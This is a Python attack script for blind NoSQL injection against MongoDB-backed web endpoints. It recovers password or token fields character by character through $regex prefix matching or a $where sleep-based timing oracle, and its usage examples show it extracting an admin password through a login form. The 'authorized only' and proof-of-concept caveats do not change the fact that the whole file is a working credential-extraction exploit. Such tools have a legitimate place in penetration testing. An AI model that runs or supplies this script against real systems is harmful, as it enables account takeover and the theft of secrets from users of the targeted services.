#!/usr/bin/env python3
"""
nosqli_blind.py - blind NoSQL data extraction, char-by-char, via a boolean or time oracle (authorized only).

When you have only a TRUE/FALSE signal (login ok/nok, result present/absent, status, length), this extracts a field's
value one character at a time. Two oracles:
  * regex (default) - MongoDB $regex prefix matching: pin a selector (e.g. username=admin), inject {field:{$regex:"^<prefix><c>"}}
                      and keep the char that flips the response to TRUE. Auto-calibrates TRUE vs FALSE from always-match /
                      never-match probes so you don't have to hand-tune the oracle.
  * where-time    - MongoDB $where JS with a bounded sleep gate; the boolean is the delay (for filtered-regex cases).

SAFE: extract YOUR OWN account's secret (or a benign marker field) to prove the primitive, then STOP - don't dump every
user's hash. Bounded sleeps only. Redact extracted values in reports. Authorized targets only.

Usage:
  # extract admin's password via a login oracle (regex), success marked by the username appearing in the body:
  python3 nosqli_blind.py --url https://t/api/login --pin username=admin --field password \
      --true-regex '"user":"admin"' --charset hex
  # auto-calibrated oracle (no marker), form encoding:
  python3 nosqli_blind.py --url https://t/api/login --pin username=admin --field password --encoding form
  # time oracle via $where:
  python3 nosqli_blind.py --url https://t/api/find --where-key '$where' --field password --mode where-time --delay-ms 800
"""
import argparse, json, re, sys, time, urllib.request, urllib.parse, urllib.error

CHARSETS = {
    "hex": "0123456789abcdef",
    "alnum": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "token": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_",
    "printable": "".join(chr(c) for c in range(33, 127)),
}


def send(url, method, headers, body, timeout):
    req = urllib.request.Request(url, data=body, method=method, headers=dict(headers))
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read()
            return r.status, len(data), data, time.time() - t0
    except urllib.error.HTTPError as e:
        data = e.read() if hasattr(e, "read") else b""
        return e.code, len(data), data, time.time() - t0
    except Exception:
        return None, 0, b"", time.time() - t0


def build_body(pins, extra_key, extra_val, as_json):
    payload = dict(pins)
    payload[extra_key] = extra_val
    if as_json:
        return json.dumps(payload).encode(), {"Content-Type": "application/json"}
    pairs = []
    def walk(prefix, val):
        if isinstance(val, dict):
            for k, v in val.items():
                walk(f"{prefix}[{k}]", v)
        else:
            pairs.append((prefix, "" if val is None else str(val)))
    for k, v in payload.items():
        walk(k, v)
    return urllib.parse.urlencode(pairs).encode(), {"Content-Type": "application/x-www-form-urlencoded"}


def make_regex(prefix, c=None, anchor_len=None):
    if anchor_len is not None:
        return {"$regex": "^.{%d}$" % anchor_len}
    body = "^" + "".join(re.escape(ch) for ch in prefix)
    if c is not None:
        body += re.escape(c)
    return {"$regex": body}


class Oracle:
    """calibrate TRUE vs FALSE and classify responses."""
    def __init__(self, true_ref, false_ref, true_regex, hdrs):
        self.tr, self.fr, self.marker, self.hdrs = true_ref, false_ref, true_regex, hdrs
        self.by = None
        if true_regex:
            self.by = "marker"
        elif true_ref[0] != false_ref[0]:
            self.by = "status"
        elif true_ref[1] != false_ref[1]:
            self.by = "length"

    def is_true(self, resp):
        st, ln, data, _ = resp
        if self.by == "marker":
            return re.search(self.marker, data.decode("utf-8", "replace")) is not None
        if self.by == "status":
            return st == self.tr[0]
        if self.by == "length":
            return abs(ln - self.tr[1]) <= abs(ln - self.fr[1])
        return False


def extract_regex(a, pins, as_json):
    hdrs = dict(h.split(":", 1) for h in a.header) if a.header else {}

    def fire(regex_cond):
        body, ct = build_body(pins, a.field, regex_cond, as_json)
        return send(a.url, a.method, {**ct, **hdrs}, body, a.timeout)

    true_ref = fire({"$regex": "^"})                       # matches anything -> TRUE
    false_ref = fire({"$regex": "^\x00NOMATCH_x8b1t_zzz$"})  # cannot match -> FALSE
    oracle = Oracle(true_ref[:2] + (None, None), false_ref[:2] + (None, None), a.true_regex, hdrs)
    if oracle.by is None:
        sys.exit("[!] could not calibrate an oracle: always-true and always-false look identical.\n"
                 "    Provide --true-regex '<marker present on match>'.")
    print(f"[i] oracle calibrated by: {oracle.by}  (TRUE~{true_ref[0]}/{true_ref[1]}  FALSE~{false_ref[0]}/{false_ref[1]})")

    # length discovery
    length = None
    for n in range(1, a.max_len + 1):
        if oracle.is_true(fire(make_regex("", anchor_len=n))):
            length = n
            break
    print(f"[i] length: {length if length else 'unknown (>%d)' % a.max_len}")

    charset = CHARSETS.get(a.charset, a.charset)
    known = ""
    limit = length or a.max_len
    while len(known) < limit:
        found = None
        for c in charset:
            if oracle.is_true(fire(make_regex(known, c))):
                found = c
                break
        if found is None:
            print(f"[i] no charset match at position {len(known)+1} - stopping (charset too small or end of value).")
            break
        known += found
        print(f"    [{len(known):>3}] {known}")
        if a.max_chars and len(known) >= a.max_chars:
            print(f"[i] reached --max-chars {a.max_chars} (SAFE-PoC: stop once proven).")
            break
    print(f"\n[RESULT] {a.field} = {known!r}   (redact this in your report)")
    return known


def extract_where_time(a, pins):
    hdrs = dict(h.split(":", 1) for h in a.header) if a.header else {}
    ms = a.delay_ms

    def timed(js):
        body, ct = build_body(pins, a.where_key, js, True)
        return send(a.url, a.method, {**ct, **hdrs}, body, a.timeout)

    # calibrate: a definitely-sleep vs no-sleep
    base = timed("true")[3]
    slept = timed(f"sleep({ms})||true")[3]
    thresh = base + (slept - base) * 0.6
    print(f"[i] timing: base~{base:.2f}s sleep~{slept:.2f}s threshold~{thresh:.2f}s")
    if slept - base < 0.2:
        sys.exit("[!] $where sleep produced no measurable delay - JS/$where likely disabled here.")

    charset = CHARSETS.get(a.charset, a.charset)
    known = ""
    for pos in range(a.max_len):
        found = None
        for c in charset:
            js = f"this.{a.field} && this.{a.field}[{pos}]=={json.dumps(c)} && sleep({ms})"
            if timed(js)[3] >= thresh:
                found = c
                break
        if found is None:
            break
        known += found
        print(f"    [{len(known):>3}] {known}")
        if a.max_chars and len(known) >= a.max_chars:
            break
    print(f"\n[RESULT] {a.field} = {known!r}   (redact in report)")
    return known


def main():
    ap = argparse.ArgumentParser(description="Blind NoSQL char-by-char extractor (authorized only).")
    ap.add_argument("--url", required=True)
    ap.add_argument("--method", default="POST")
    ap.add_argument("--encoding", choices=["json", "form"], default="json")
    ap.add_argument("--pin", action="append", default=[], metavar="k=v",
                    help="fixed selector field(s), e.g. username=admin (repeatable)")
    ap.add_argument("--field", required=True, help="field to extract (e.g. password, token)")
    ap.add_argument("--mode", choices=["regex", "where-time"], default="regex")
    ap.add_argument("--where-key", default="$where", help="key to carry $where JS (where-time mode)")
    ap.add_argument("--true-regex", help="regex marking a TRUE/match response (else auto-calibrate by status/length)")
    ap.add_argument("--charset", default="alnum", help="hex|alnum|token|printable or a literal charset string")
    ap.add_argument("--max-len", type=int, default=64)
    ap.add_argument("--max-chars", type=int, default=0, help="stop after N chars (SAFE-PoC: prove then stop)")
    ap.add_argument("--delay-ms", type=int, default=800, help="sleep() ms for where-time oracle")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--timeout", type=float, default=20.0)
    a = ap.parse_args()

    pins = {}
    for kv in a.pin:
        k, _, v = kv.partition("=")
        pins[k] = v
    if a.mode == "where-time":
        return 0 if extract_where_time(a, pins) is not None else 1
    extract_regex(a, pins, a.encoding == "json")
    return 0


if __name__ == "__main__":
    sys.exit(main())
